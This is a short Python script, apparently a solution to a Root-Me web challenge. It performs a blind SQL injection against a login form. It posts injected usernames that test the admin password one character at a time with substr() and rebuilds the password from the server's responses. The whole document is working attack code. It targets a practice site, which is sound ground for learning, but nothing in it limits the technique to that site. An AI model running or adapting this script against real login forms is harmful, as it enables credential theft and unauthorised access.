import requests
import string
url = "http://challenge01.root-me.org/web-serveur/ch10/"
c=""
charset= string.printable
for i in range(1,12):
	"admin' and substr((select password from users),2,1)='e'-- -"
	for j in charset:
		payload={"username":"admin' and substr((select password from users where username='admin'),"+str(i)+",1)='"+j+"'-- -","password":"123"}
		print(payload)
		x = requests.post(url,data=payload )
		#print(x.text)
		if "no such user/password" not in x.text:
			print(j)
			c+=j
			break

print(c)